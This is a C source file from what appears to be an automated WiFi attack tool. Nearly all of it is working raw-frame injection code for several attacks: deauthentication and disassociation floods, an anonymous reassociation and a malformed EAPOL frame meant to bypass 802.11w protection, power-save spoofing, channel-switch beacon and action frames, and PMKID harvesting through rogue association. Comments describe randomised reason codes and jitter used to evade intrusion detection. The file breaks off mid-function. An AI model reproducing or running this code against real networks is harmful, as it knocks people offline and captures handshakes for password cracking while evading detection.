/* brain_attacks.c — Attack functions (Sprint 7 #21: extracted from brain.c)
 * Contains: raw injection, 13 attack phase functions, shared constants
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <math.h>
#include <errno.h>
#include <sys/socket.h>
#include <linux/if_packet.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <net/ethernet.h>
#include <arpa/inet.h>
#include "brain.h"
#include "brain_attacks.h"
#include "health_monitor.h"

/* Reason codes — expanded with WiFi 6e codes to evade WIDS fingerprinting */
#define REASON_CLASS3_FRAME 7   /* Class 3 frame from nonassociated STA */
#define REASON_STA_LEAVING 8    /* STA leaving BSS */
#define REASON_INACTIVITY 4     /* Disassoc due to inactivity */
#define REASON_INVALID_IE 13    /* Invalid information element */
#define REASON_MIC_FAILURE 14   /* MIC failure */
#define REASON_4WAY_TIMEOUT 15  /* 4-Way handshake timeout */
#define REASON_INVALID_RSNE 72  /* Invalid RSNE capabilities (WiFi 6e) */
#define REASON_TDLS_TEARDOWN 25 /* TDLS teardown unreachable */

/* Pool of reason codes to randomize — evades timing-based WIDS */
const uint8_t REASON_POOL_AP[] = {
    REASON_CLASS3_FRAME, REASON_INACTIVITY, REASON_INVALID_IE,
    REASON_MIC_FAILURE, REASON_4WAY_TIMEOUT, REASON_INVALID_RSNE
};
const uint8_t REASON_POOL_STA[] = {
    REASON_STA_LEAVING, REASON_INACTIVITY, REASON_TDLS_TEARDOWN
};

/* Jitter helper: adds ±30% randomization to delay values for WIDS evasion */
useconds_t jitter_usleep(useconds_t base_us) {
    int jitter = (int)(base_us * 0.3);
    if (jitter == 0) return base_us;
    return (useconds_t)(base_us - jitter + (rand() % (2 * jitter + 1)));
}


/* Broadcast MAC */
const uint8_t BCAST_MAC[6] = {0xff,0xff,0xff,0xff,0xff,0xff};

/* Global raw injection socket */
int g_raw_sock = -1;
health_state_t *g_health_state = NULL;  /* CPU profiler */


/* Sequence number counters for raw frame injection (AngryOxide uses 3) */
static uint16_t g_seq_ap = 0;     /* Frames pretending to be AP */
static uint16_t g_seq_client = 0; /* Frames pretending to be client */
static uint16_t g_seq_probe = 0;  /* Probe/discovery frames */

uint16_t next_seq_ap(void) { return (g_seq_ap++ & 0x0FFF) << 4; }
uint16_t next_seq_client(void) { return (g_seq_client++ & 0x0FFF) << 4; }
uint16_t next_seq_probe(void) { return (g_seq_probe++ & 0x0FFF) << 4; }

/* ============================================================================
 * Constants
 * ========================================================================== */

const char *brain_mood_names[] = {
    [MOOD_STARTING]  = "starting",
    [MOOD_READY]     = "ready",
    [MOOD_NORMAL]    = "normal",
    [MOOD_BORED]     = "bored",
    [MOOD_SAD]       = "sad",
    [MOOD_ANGRY]     = "angry",
    [MOOD_LONELY]    = "lonely",
    [MOOD_EXCITED]   = "excited",
    [MOOD_GRATEFUL]  = "grateful",
    [MOOD_SLEEPING]  = "sleeping",
    [MOOD_REBOOTING] = "rebooting"
};

const char *brain_frustration_names[] = {
    [FRUST_GENERIC]         = "generic",
    [FRUST_NO_CLIENTS]      = "no_clients",
    [FRUST_WPA3]            = "wpa3_pmf",
    [FRUST_WEAK_SIGNAL]     = "weak_signal",
    [FRUST_DEAUTHS_IGNORED] = "deauths_ignored",
};

/* ============================================================================
 * Raw Frame Injection System
 * ========================================================================== */

int attack_raw_inject_open(void) {
    int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sock < 0) {
        fprintf(stderr, "[brain] raw_inject: socket() failed: %s\n", strerror(errno));
        return -1;
    }
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, RAW_INJECT_IFACE, IFNAMSIZ - 1);
    if (ioctl(sock, SIOCGIFINDEX, &ifr) < 0) {
        fprintf(stderr, "[brain] raw_inject: ioctl failed for %s: %s\n",
                RAW_INJECT_IFACE, strerror(errno));
        close(sock);
        return -1;
    }
    struct sockaddr_ll sll;
    memset(&sll, 0, sizeof(sll));
    sll.sll_family   = AF_PACKET;
    sll.sll_ifindex  = ifr.ifr_ifindex;
    sll.sll_protocol = htons(ETH_P_ALL);
    if (bind(sock, (struct sockaddr *)&sll, sizeof(sll)) < 0) {
        fprintf(stderr, "[brain] raw_inject: bind() failed: %s\n", strerror(errno));
        close(sock);
        return -1;
    }
    fprintf(stderr, "[brain] raw_inject: opened on %s (ifindex=%d)\n",
            RAW_INJECT_IFACE, ifr.ifr_ifindex);
    return sock;
}

int attack_raw_send(int sock, const uint8_t *frame, size_t len) {
    if (sock < 0 || !frame || len == 0) return -1;
    ssize_t sent = write(sock, frame, len);
    return (sent > 0) ? (int)sent : -1;
}

/* ============================================================================
 * Anonymous Reassociation Attack (MFP/PMF Bypass)
 * From AngryOxide: build_reassociation_request
 * One frame deauths ALL clients - AP itself sends the signed deauth
 * ========================================================================== */

int attack_anon_reassoc(int sock, const bcap_ap_t *ap) {
    uint8_t frame[256];
    int p = 0;
    size_t ssid_len = strlen(ap->ssid);
    if (ssid_len > 32) ssid_len = 32;

    /* Radiotap header (8 bytes, minimal) */
    frame[p++]=0; frame[p++]=0; frame[p++]=8; frame[p++]=0;
    frame[p++]=0; frame[p++]=0; frame[p++]=0; frame[p++]=0;

    /* FC: Reassociation Request (subtype 0x02, type 0x00) */
    frame[p++]=0x20; frame[p++]=0x00;
    /* Duration */
    frame[p++]=0x00; frame[p++]=0x00;
    /* Addr1=AP (dst) */
    memcpy(&frame[p], ap->bssid.addr, 6); p+=6;
    /* Addr2=BROADCAST (anonymous source - the key trick) */
    memcpy(&frame[p], BCAST_MAC, 6); p+=6;
    /* Addr3=AP (BSSID) */
    memcpy(&frame[p], ap->bssid.addr, 6); p+=6;
    /* SeqCtl (client counter) */
    { uint16_t seq = next_seq_client(); frame[p++] = seq & 0xFF; frame[p++] = (seq >> 8) & 0xFF; }

    /* Fixed: Capability(2) + ListenInterval(2) + CurrentAP(6) */
    frame[p++]=0x31; frame[p++]=0x04;
    frame[p++]=0x0a; frame[p++]=0x00;
    memcpy(&frame[p], ap->bssid.addr, 6); p+=6;

    /* IE: SSID */
    frame[p++]=0x00; frame[p++]=(uint8_t)ssid_len;
    memcpy(&frame[p], ap->ssid, ssid_len); p+=ssid_len;

    /* IE: Supported Rates */
    frame[p++]=0x01; frame[p++]=0x08;
    frame[p++]=0x82; frame[p++]=0x84; frame[p++]=0x8b; frame[p++]=0x96;
    frame[p++]=0x0c; frame[p++]=0x12; frame[p++]=0x18; frame[p++]=0x24;

    /* IE: RSN (WPA2 + MFP Capable) */
    int ccmp = (strstr(ap->encryption, "WPA2") != NULL);
    uint8_t cs = ccmp ? 0x04 : 0x02;
    frame[p++]=0x30; frame[p++]=20;
    frame[p++]=0x01; frame[p++]=0x00;
    frame[p++]=0x00; frame[p++]=0x0f; frame[p++]=0xac; frame[p++]=cs;
    frame[p++]=0x01; frame[p++]=0x00;
    frame[p++]=0x00; frame[p++]=0x0f; frame[p++]=0xac; frame[p++]=cs;
    frame[p++]=0x01; frame[p++]=0x00;
    frame[p++]=0x00; frame[p++]=0x0f; frame[p++]=0xac; frame[p++]=0x02;
    frame[p++]=0x80; frame[p++]=0x00; /* MFP capable */

    int ret = attack_raw_send(sock, frame, p);
    if (ret > 0) {
        fprintf(stderr, "[brain] [anon_reassoc] %s (%02x:%02x:%02x:%02x:%02x:%02x) ch%d MFP-bypass %db\n",
                ap->ssid,
                ap->bssid.addr[0], ap->bssid.addr[1], ap->bssid.addr[2],
                ap->bssid.addr[3], ap->bssid.addr[4], ap->bssid.addr[5],
                ap->channel, ret);
    }
    return ret;
}

/* ============================================================================
 * Malformed EAPOL M1 Attack (PMF Bypass - probenpwn-inspired)
 *
 * Sends a crafted EAPOL Message 1 (ANonce) with intentionally malformed
 * fields. Many WPA2/WPA3 clients will disconnect from their AP when they
 * receive an unexpected/invalid M1 from what appears to be their AP,
 * even with PMF enabled (because EAPOL is not protected by 802.11w).
 *
 * This exploits the fact that EAPOL key exchanges happen BEFORE
 * PMF keys are derived, so the AP can't protect M1 even with MFP required.
 * ========================================================================== */
int attack_eapol_m1_malformed(int sock, const bcap_ap_t *ap, const bcap_sta_t *sta) {
    uint8_t frame[256];
    int p = 0;

    /* Radiotap header (8 bytes) */
    frame[p++]=0; frame[p++]=0; frame[p++]=8; frame[p++]=0;
    frame[p++]=0; frame[p++]=0; frame[p++]=0; frame[p++]=0;

    /* 802.11 Data frame: FC=0x08 0x02 (Data, From-DS) */
    frame[p++]=0x08; frame[p++]=0x02;
    /* Duration */
    frame[p++]=0x00; frame[p++]=0x00;
    /* Addr1 = Client (dst) */
    memcpy(&frame[p], sta->mac.addr, 6); p+=6;
    /* Addr2 = AP (src / BSSID in From-DS) */
    memcpy(&frame[p], ap->bssid.addr, 6); p+=6;
    /* Addr3 = AP (BSSID) */
    memcpy(&frame[p], ap->bssid.addr, 6); p+=6;
    /* Sequence control */
    { uint16_t seq = next_seq_ap(); frame[p++] = seq & 0xFF; frame[p++] = (seq >> 8) & 0xFF; }

    /* LLC/SNAP header for EAPOL */
    frame[p++]=0xaa; frame[p++]=0xaa; frame[p++]=0x03; /* LLC */
    frame[p++]=0x00; frame[p++]=0x00; frame[p++]=0x00; /* SNAP OUI */
    frame[p++]=0x88; frame[p++]=0x8e;                   /* EtherType: 802.1X (EAPOL) */

    /* EAPOL header */
    frame[p++]=0x02;    /* Version: 802.1X-2004 */
    frame[p++]=0x03;    /* Type: Key */
    frame[p++]=0x00; frame[p++]=0x5f;  /* Body Length: 95 */

    /* EAPOL-Key descriptor */
    frame[p++]=0x02;    /* Descriptor Type: RSN Key (2) */

    /* Key Information: Pairwise + Key Index 0 + ACK (= M1 indicator)
     * Bit 3: Pairwise, Bit 7: ACK, Bit 8: Install=0 (NOT M3) */
    frame[p++]=0x00; frame[p++]=0x8a;

    /* Key Length: 16 (CCMP) */
    frame[p++]=0x00; frame[p++]=0x10;

    /* Replay Counter (8 bytes) - intentionally corrupted to trigger error path */
    frame[p++]=0xff; frame[p++]=0xff; frame[p++]=0xff; frame[p++]=0xff;
    frame[p++]=0xff; frame[p++]=0xff; frame[p++]=0xff; frame[p++]=0xff;

    /* ANonce (32 bytes) - random, looks like a real M1 nonce */
    for (int i = 0; i < 32; i++) frame[p++] = rand() & 0xff;

    /* Key IV (16 bytes) - zeros */
    memset(&frame[p], 0, 16); p += 16;

    /* Key RSC (8 bytes) - zeros */
    memset(&frame[p], 0, 8); p += 8;

    /* Key ID (8 bytes) - zeros */
    memset(&frame[p], 0, 8); p += 8;

    /* Key MIC (16 bytes) - intentionally wrong (the malformed part) */
    memset(&frame[p], 0xde, 16); p += 16;

    /* Key Data Length: 0 (no KDE) */
    frame[p++]=0x00; frame[p++]=0x00;

    int ret = attack_raw_send(sock, frame, p);
    if (ret > 0) {
        fprintf(stderr, "[brain] [eapol-m1-bad] %s -> %02x:%02x:%02x:%02x:%02x:%02x PMF-bypass %db\n",
                ap->ssid,
                sta->mac.addr[0], sta->mac.addr[1], sta->mac.addr[2],
                sta->mac.addr[3], sta->mac.addr[4], sta->mac.addr[5], ret);
    }
    return ret;
}

/* ============================================================================
 * Power-Save Spoof Attack (PMF Bypass - probenpwn-inspired)
 *
 * Spoof a Null Data frame from the client to the AP with the Power
 * Management bit set. The AP will buffer frames for the client, which
 * disrupts the client's connection. When the client wakes and sends
 * a PS-Poll or null frame with PM=0, the buffered frames arrive out of
 * order, often causing the client to re-associate (triggering handshake).
 *
 * This works even with 802.11w/PMF because Null Data frames are
 * management-class and some APs don't validate their origin with MFP.
 * ========================================================================== */
int attack_power_save_spoof(int sock, const bcap_ap_t *ap, const bcap_sta_t *sta) {
    uint8_t frame[64];
    int total = 0;

    /* Send PS bit=1 (client entering power save) */
    {
        int p = 0;
        /* Radiotap header */
        frame[p++]=0; frame[p++]=0; frame[p++]=8; frame[p++]=0;
        frame[p++]=0; frame[p++]=0; frame[p++]=0; frame[p++]=0;

        /* 802.11 Null Data: FC=0x48 0x11
         * Subtype: Null Data (0x04), Type: Data (0x02)
         * Flags: To-DS=1, Power-Management=1 (bit 4 of flags byte)
         * FC byte 1 = 0x48 (Data + Null subtype)
         * FC byte 2 = 0x11 (To-DS + PM) */
        frame[p++]=0x48; frame[p++]=0x11;
        /* Duration */
        frame[p++]=0x00; frame[p++]=0x00;
        /* Addr1 = AP (BSSID, dst in To-DS) */
        memcpy(&frame[p], ap->bssid.addr, 6); p+=6;
        /* Addr2 = Client (spoofed src) */
        memcpy(&frame[p], sta->mac.addr, 6); p+=6;
        /* Addr3 = AP (BSSID) */
        memcpy(&frame[p], ap->bssid.addr, 6); p+=6;
        /* Sequence control */
        { uint16_t seq = next_seq_client(); frame[p++] = seq & 0xFF; frame[p++] = (seq >> 8) & 0xFF; }

        int ret = attack_raw_send(sock, frame, p);
        if (ret > 0) total += ret;
    }

    /* Brief delay, then send PS bit=0 (client waking up) to trigger buffered frame dump */
    usleep(jitter_usleep(10000)); /* ~7-13ms (jittered) */
    {
        int p = 0;
        frame[p++]=0; frame[p++]=0; frame[p++]=8; frame[p++]=0;
        frame[p++]=0; frame[p++]=0; frame[p++]=0; frame[p++]=0;

        /* Null Data: To-DS=1, PM=0 (waking up) */
        frame[p++]=0x48; frame[p++]=0x01;  /* To-DS only, no PM */
        frame[p++]=0x00; frame[p++]=0x00;
        memcpy(&frame[p], ap->bssid.addr, 6); p+=6;
        memcpy(&frame[p], sta->mac.addr, 6); p+=6;
        memcpy(&frame[p], ap->bssid.addr, 6); p+=6;
        { uint16_t seq = next_seq_client(); frame[p++] = seq & 0xFF; frame[p++] = (seq >> 8) & 0xFF; }

        int ret = attack_raw_send(sock, frame, p);
        if (ret > 0) total += ret;
    }

    if (total > 0) {
        fprintf(stderr, "[brain] [ps-spoof] %s: %02x:%02x:%02x:%02x:%02x:%02x sleep+wake %db\n",
                ap->ssid,
                sta->mac.addr[0], sta->mac.addr[1], sta->mac.addr[2],
                sta->mac.addr[3], sta->mac.addr[4], sta->mac.addr[5], total);
    }
    return total;
}

/* ============================================================================
 * Bidirectional Disassociation Attack
 * From AngryOxide: build_disassocation_from_ap + build_disassocation_from_client
 * Sends disassoc BOTH directions with specific reason codes
 * ========================================================================== */

int attack_disassoc_bidi(int sock, const bcap_ap_t *ap, const bcap_sta_t *sta) {
    uint8_t frame[64];
    int total = 0;

    /* Direction 1: AP -> Client (reason=7: Class3 frame from nonassociated STA) */
    {
        int p = 0;
        frame[p++]=0; frame[p++]=0; frame[p++]=8; frame[p++]=0;
        frame[p++]=0; frame[p++]=0; frame[p++]=0; frame[p++]=0;
        frame[p++]=0xa0; frame[p++]=0x00;
        frame[p++]=0x00; frame[p++]=0x00;
        memcpy(&frame[p], sta->mac.addr, 6); p+=6;
        memcpy(&frame[p], ap->bssid.addr, 6); p+=6;
        memcpy(&frame[p], ap->bssid.addr, 6); p+=6;
        { uint16_t seq = next_seq_ap(); frame[p++] = seq & 0xFF; frame[p++] = (seq >> 8) & 0xFF; }
        { uint8_t _r = RANDOM_REASON_AP(); frame[p++]=_r; frame[p++]=0x00; }
        int ret = attack_raw_send(sock, frame, p);
        if (ret > 0) total += ret;
    }

    /* Direction 2: Client -> AP (reason=8: STA leaving BSS) */
    {
        int p = 0;
        frame[p++]=0; frame[p++]=0; frame[p++]=8; frame[p++]=0;
        frame[p++]=0; frame[p++]=0; frame[p++]=0; frame[p++]=0;
        frame[p++]=0xa0; frame[p++]=0x01;
        frame[p++]=0x00; frame[p++]=0x00;
        memcpy(&frame[p], ap->bssid.addr, 6); p+=6;
        memcpy(&frame[p], sta->mac.addr, 6); p+=6;
        memcpy(&frame[p], ap->bssid.addr, 6); p+=6;
        { uint16_t seq = next_seq_client(); frame[p++] = seq & 0xFF; frame[p++] = (seq >> 8) & 0xFF; }
        { uint8_t _r = RANDOM_REASON_STA(); frame[p++]=_r; frame[p++]=0x00; }
        int ret = attack_raw_send(sock, frame, p);
        if (ret > 0) total += ret;
    }

    if (total > 0) {
        fprintf(stderr, "[brain] [disassoc] %s <-> %02x:%02x:%02x:%02x:%02x:%02x bidi %db\n",
                ap->ssid,
                sta->mac.addr[0], sta->mac.addr[1], sta->mac.addr[2],
                sta->mac.addr[3], sta->mac.addr[4], sta->mac.addr[5],
                total);
    }
    return total;
}


/* ============================================================================
 * Broadcast Deauthentication Attack
 * Deauth from AP to broadcast (ff:ff:ff:ff:ff:ff) - hits ALL clients at once

/* ============================================================================
 * CSA Beacon Attack (Raw Frame Injection)
 * From AngryOxide: build_csa_beacon + csa_attack
 *
 * Clone the AP's beacon with a CSA Information Element (IE tag 37)
 * to announce a channel switch to channel 14 (always invalid).
 * Sends 6 beacons with countdown 5→0 to force immediate switch.
 *
 * 802.11 CSA IE (tag 37):
 *   [1] Channel Switch Mode (0=no restrict, 1=restrict tx)  
 *   [1] New Channel Number
 *   [1] Channel Switch Count (countdown in beacon intervals)
 * ========================================================================== */
int attack_csa_beacon(int sock, const bcap_ap_t *ap) {
    if (sock < 0 || !ap) return -1;

    /* We send 6 beacons with countdown 5→0 (like AngryOxide) */
    int sent = 0;
    for (int count = 5; count >= 0; count--) {
        uint8_t frame[256];
        int p = 0;

        /* Radiotap header (8 bytes, no-ack) */
        frame[p++]=0x00; frame[p++]=0x00; /* version + pad */
        frame[p++]=0x08; frame[p++]=0x00; /* header length */
        frame[p++]=0x00; frame[p++]=0x00; frame[p++]=0x00; frame[p++]=0x00; /* bitmap: none */

        /* 802.11 Beacon frame: FC=0x80 0x00 */
        frame[p++]=0x80; frame[p++]=0x00; /* Frame Control: Beacon */
        frame[p++]=0x00; frame[p++]=0x00; /* Duration */

        /* Addresses: dst=broadcast, src=AP, bssid=AP */
        memcpy(&frame[p], BCAST_MAC, 6); p+=6;           /* addr1: broadcast */
        memcpy(&frame[p], ap->bssid.addr, 6); p+=6;      /* addr2: AP (src) */
        memcpy(&frame[p], ap->bssid.addr, 6); p+=6;      /* addr3: AP (bssid) */

        /* Sequence control (AP counter) */
        uint16_t seq = next_seq_ap();
        frame[p++] = seq & 0xFF;
        frame[p++] = (seq >> 8) & 0xFF;

        /* Beacon body */
        /* Timestamp (8 bytes) - fake */
        memset(&frame[p], 0, 8); p+=8;
        /* Beacon interval (2 bytes) - 100 TU (0x0064) */
        frame[p++]=0x64; frame[p++]=0x00;
        /* Capability info (2 bytes) - ESS + Privacy */
        frame[p++]=0x31; frame[p++]=0x04;

        /* IE: SSID (tag 0) */
        int ssid_len = strlen(ap->ssid);
        if (ssid_len > 32) ssid_len = 32;
        frame[p++]=0x00;                    /* Tag: SSID */
        frame[p++]=(uint8_t)ssid_len;       /* Length */
        memcpy(&frame[p], ap->ssid, ssid_len); p+=ssid_len;

        /* IE: Supported Rates (tag 1) - minimal */
        frame[p++]=0x01; frame[p++]=0x04;
        frame[p++]=0x82; frame[p++]=0x84; frame[p++]=0x8b; frame[p++]=0x96;

        /* IE: DS Parameter Set (tag 3) - original channel */
        frame[p++]=0x03; frame[p++]=0x01;
        frame[p++]=(uint8_t)ap->channel;

        /* IE: CSA (tag 37) - THE KEY ELEMENT */
        frame[p++]=0x25;    /* Tag: Channel Switch Announcement (37) */
        frame[p++]=0x03;    /* Length: 3 */
        frame[p++]=0x01;    /* Mode: 1 (restrict tx until switch) */
        frame[p++]=14;      /* New Channel: 14 (always invalid) */
        frame[p++]=(uint8_t)count;  /* Count: countdown 5→0 */

        if (attack_raw_send(sock, frame, p) > 0) sent++;
    }

    if (sent > 0) {
        fprintf(stderr, "[brain] [csa-beacon] %s ch%d -> ch14 (%d beacons)\n",
                ap->ssid, ap->channel, sent);
    }
    return sent;
}

/* ============================================================================
 * CSA Action Frame Attack (Raw Frame Injection)
 * From AngryOxide: build_csa_action
 *
 * Sends a Management Action frame (Category: Spectrum Management, Action: 4)
 * with the CSA IE to broadcast, telling all clients to switch to ch14.
 *
 * 802.11 Action Frame body:
 *   [1] Category: 0 (Spectrum Management)
 *   [1] Action:   4 (Channel Switch Announcement)
 *   Then CSA IE (tag 37)
 * ========================================================================== */
int attack_csa_action(int sock, const bcap_ap_t *ap) {
    if (sock < 0 || !ap) return -1;

    uint8_t frame[128];
    int p = 0;

    /* Radiotap header (8 bytes) */
    frame[p++]=0x00; frame[p++]=0x00;
    frame[p++]=0x08; frame[p++]=0x00;
    frame[p++]=0x00; frame[p++]=0x00; frame[p++]=0x00; frame[p++]=0x00;

    /* 802.11 Action frame: FC=0xd0 0x00 */
    frame[p++]=0xd0; frame[p++]=0x00; /* Frame Control: Action */
    frame[p++]=0x3a; frame[p++]=0x01; /* Duration */

    /* Addresses: dst=broadcast, src=AP, bssid=AP */
    memcpy(&frame[p], BCAST_MAC, 6); p+=6;           /* addr1: broadcast */
    memcpy(&frame[p], ap->bssid.addr, 6); p+=6;      /* addr2: AP (src) */
    memcpy(&frame[p], ap->bssid.addr, 6); p+=6;      /* addr3: AP (bssid) */

    /* Sequence control (AP counter) */
    { uint16_t seq = next_seq_ap(); frame[p++] = seq & 0xFF; frame[p++] = (seq >> 8) & 0xFF; }

    /* Action frame body */
    frame[p++]=0x00;    /* Category: Spectrum Management */
    frame[p++]=0x04;    /* Action: Channel Switch Announcement */

    /* CSA IE (tag 37) within the action frame */
    frame[p++]=0x25;    /* Tag: CSA (37) */
    frame[p++]=0x03;    /* Length: 3 */
    frame[p++]=0x01;    /* Mode: 1 (restrict tx) */
    frame[p++]=14;      /* New Channel: 14 */
    frame[p++]=0x03;    /* Count: 3 */

    int ret = attack_raw_send(sock, frame, p);
    if (ret > 0) {
        fprintf(stderr, "[brain] [csa-action] %s -> broadcast ch14\n", ap->ssid);
    }
    return ret;
}

/* ============================================================================
 * Broadcast Deauth Attack (Raw Frame Injection)
 * AngryOxide equivalent: deauth_attack with broadcast destination
 * ========================================================================== */
int attack_deauth_broadcast(int sock, const bcap_ap_t *ap) {
    uint8_t frame[64];
    int p = 0;
    /* Radiotap header */
    frame[p++]=0; frame[p++]=0; frame[p++]=8; frame[p++]=0;
    frame[p++]=0; frame[p++]=0; frame[p++]=0; frame[p++]=0;
    /* Deauth: FC=0xc0 0x00 */
    frame[p++]=0xc0; frame[p++]=0x00;
    frame[p++]=0x00; frame[p++]=0x00; /* Duration */
    memcpy(&frame[p], BCAST_MAC, 6); p+=6;     /* dst: broadcast */
    memcpy(&frame[p], ap->bssid.addr, 6); p+=6; /* src: AP */
    memcpy(&frame[p], ap->bssid.addr, 6); p+=6; /* bssid: AP */
    { uint16_t seq = next_seq_ap(); frame[p++] = seq & 0xFF; frame[p++] = (seq >> 8) & 0xFF; } /* Seq */
    { uint8_t _r = RANDOM_REASON_AP(); frame[p++]=_r; frame[p++]=0x00; } /* Reason */

    int ret = attack_raw_send(sock, frame, p);
    if (ret > 0) {
        fprintf(stderr, "[brain] [deauth-bcast] %s -> broadcast %db\n",
                ap->ssid, ret);
    }
    return ret;
}


/* ============================================================================
 * Bidirectional Deauthentication Attack (per-client, raw injection)
 * From AngryOxide: build_deauthentication_from_ap + build_deauthentication_from_client
 * AP->Client: reason 7 (Class3 frame from nonassociated STA)
 * Client->AP: reason 8 (STA is leaving BSS)
 * ========================================================================== */
int attack_deauth_bidi(int sock, const bcap_ap_t *ap, const bcap_sta_t *sta) {
    uint8_t frame[64];
    int total = 0;

    /* Direction 1: AP -> Client (reason=7: Class3 frame) */
    {
        int p = 0;
        frame[p++]=0; frame[p++]=0; frame[p++]=8; frame[p++]=0;
        frame[p++]=0; frame[p++]=0; frame[p++]=0; frame[p++]=0;
        /* Deauth: FC=0xc0 0x00 */
        frame[p++]=0xc0; frame[p++]=0x00;
        frame[p++]=0x00; frame[p++]=0x00; /* Duration */
        memcpy(&frame[p], sta->mac.addr, 6); p+=6;      /* DA: client */
        memcpy(&frame[p], ap->bssid.addr, 6); p+=6;     /* SA: AP */
        memcpy(&frame[p], ap->bssid.addr, 6); p+=6;     /* BSSID: AP */
        { uint16_t seq = next_seq_ap(); frame[p++] = seq & 0xFF; frame[p++] = (seq >> 8) & 0xFF; }
        { uint8_t _r = RANDOM_REASON_AP(); frame[p++]=_r; frame[p++]=0x00; } /* Reason 7 */
        int ret = attack_raw_send(sock, frame, p);
        if (ret > 0) total += ret;
    }

    /* Direction 2: Client -> AP (reason=8: STA leaving BSS) */
    {
        int p = 0;
        frame[p++]=0; frame[p++]=0; frame[p++]=8; frame[p++]=0;
        frame[p++]=0; frame[p++]=0; frame[p++]=0; frame[p++]=0;
        /* Deauth: FC=0xc0 0x01 (FromDS=0, ToDS=1) */
        frame[p++]=0xc0; frame[p++]=0x01;
        frame[p++]=0x00; frame[p++]=0x00; /* Duration */
        memcpy(&frame[p], ap->bssid.addr, 6); p+=6;     /* DA: AP */
        memcpy(&frame[p], sta->mac.addr, 6); p+=6;      /* SA: client */
        memcpy(&frame[p], ap->bssid.addr, 6); p+=6;     /* BSSID: AP */
        { uint16_t seq = next_seq_client(); frame[p++] = seq & 0xFF; frame[p++] = (seq >> 8) & 0xFF; }
        { uint8_t _r = RANDOM_REASON_STA(); frame[p++]=_r; frame[p++]=0x00; }  /* Reason 8 */
        int ret = attack_raw_send(sock, frame, p);
        if (ret > 0) total += ret;
    }

    if (total > 0) {
        fprintf(stderr, "[brain] [deauth-bidi] %s <-> %02x:%02x:%02x:%02x:%02x:%02x %db\n",
                ap->ssid,
                sta->mac.addr[0], sta->mac.addr[1], sta->mac.addr[2],
                sta->mac.addr[3], sta->mac.addr[4], sta->mac.addr[5],
                total);
    }
    return total;
}

/* ============================================================================
 * Raw Probe Request - Undirected (discover all APs on channel)
 * Replaces broken bettercap wifi.probe (HTTP 400)
 * AngryOxide equivalent: build_probe_request_undirected
 * ========================================================================== */
int attack_probe_undirected(int sock) {
    uint8_t frame[128];
    int p = 0;
    /* Radiotap */
    frame[p++]=0; frame[p++]=0; frame[p++]=8; frame[p++]=0;
    frame[p++]=0; frame[p++]=0; frame[p++]=0; frame[p++]=0;
    /* Probe Request: FC=0x40 0x00 */
    frame[p++]=0x40; frame[p++]=0x00;
    frame[p++]=0x00; frame[p++]=0x00;
    memcpy(&frame[p], BCAST_MAC, 6); p+=6;     /* dst: broadcast */
    /* src: random locally-administered MAC */
    uint8_t src_mac[6];
    for (int i = 0; i < 6; i++) src_mac[i] = rand() & 0xff;
    src_mac[0] &= 0xfe; src_mac[0] |= 0x02;
    memcpy(&frame[p], src_mac, 6); p+=6;
    memcpy(&frame[p], BCAST_MAC, 6); p+=6;     /* bssid: broadcast */
    { uint16_t seq = next_seq_probe(); frame[p++] = seq & 0xFF; frame[p++] = (seq >> 8) & 0xFF; }
    /* Wildcard SSID (empty = discover all) */
    frame[p++]=0x00; frame[p++]=0x00; /* Tag 0, Length 0 */
    /* Supported Rates */
    frame[p++]=0x01; frame[p++]=0x08;
    frame[p++]=0x82; frame[p++]=0x84; frame[p++]=0x8b; frame[p++]=0x96;
    frame[p++]=0x24; frame[p++]=0x30; frame[p++]=0x48; frame[p++]=0x6c;

    int ret = attack_raw_send(sock, frame, p);
    if (ret > 0) {
        fprintf(stderr, "[brain] [probe] undirected broadcast %db\n", ret);
    }
    return ret;
}

/* ============================================================================
 * Raw Probe Request - Directed at specific AP (reveals hidden SSIDs)
 * AngryOxide equivalent: build_probe_request_directed / build_probe_request_target
 * ========================================================================== */
int attack_probe_directed(int sock, const bcap_ap_t *ap) {
    uint8_t frame[192];
    int p = 0;
    frame[p++]=0; frame[p++]=0; frame[p++]=8; frame[p++]=0;
    frame[p++]=0; frame[p++]=0; frame[p++]=0; frame[p++]=0;
    frame[p++]=0x40; frame[p++]=0x00;
    frame[p++]=0x00; frame[p++]=0x00;
    memcpy(&frame[p], ap->bssid.addr, 6); p+=6;   /* dst: AP */
    uint8_t src_mac[6];
    for (int i = 0; i < 6; i++) src_mac[i] = rand() & 0xff;
    src_mac[0] &= 0xfe; src_mac[0] |= 0x02;
    memcpy(&frame[p], src_mac, 6); p+=6;
    memcpy(&frame[p], ap->bssid.addr, 6); p+=6;   /* bssid: AP */
    { uint16_t seq = next_seq_probe(); frame[p++] = seq & 0xFF; frame[p++] = (seq >> 8) & 0xFF; }
    /* Target SSID */
    int ssid_len = strlen(ap->ssid);
    if (ssid_len > 32) ssid_len = 32;
    frame[p++]=0x00; frame[p++]=(uint8_t)ssid_len;
    memcpy(&frame[p], ap->ssid, ssid_len); p+=ssid_len;
    /* Supported Rates */
    frame[p++]=0x01; frame[p++]=0x08;
    frame[p++]=0x82; frame[p++]=0x84; frame[p++]=0x8b; frame[p++]=0x96;
    frame[p++]=0x24; frame[p++]=0x30; frame[p++]=0x48; frame[p++]=0x6c;

    int ret = attack_raw_send(sock, frame, p);
    if (ret > 0) {
        fprintf(stderr, "[brain] [probe] -> %s %db\n", ap->ssid, ret);
    }
    return ret;
}

/* ============================================================================
 * Direct Auth + Association for PMKID (raw frame, replaces wifi.assoc)
 * AngryOxide equivalent: m1_retrieval_attack + m1_retrieval_attack_phase_2
 * Phase 1: Authentication (Open System, seq=1) with random rogue MAC
 * Phase 2: Association Request with RSN IE (WPA2-PSK, MFP capable)
 * AP responds with M1 containing PMKID - bettercap captures it
 * ========================================================================== */
int attack_auth_assoc_pmkid(int sock, const bcap_ap_t *ap) {
    uint8_t frame[256];
    int total = 0;

    /* Random rogue MAC for this association attempt */
    uint8_t rogue[6];
    for (int i = 0; i < 6; i++) rogue[i] = rand() & 0xff;
    rogue[0] &= 0xfe; rogue[0] |= 0x02; /* locally administered */

    /* Phase 1: Authentication frame (Open System, seq=1) */
    {
        int p = 0;
        frame[p++]=0; frame[p++]=0; frame[p++]=8; frame[p++]=0;
        frame[p++]=0; frame[p++]=0; frame[p++]=0; frame[p++]=0;
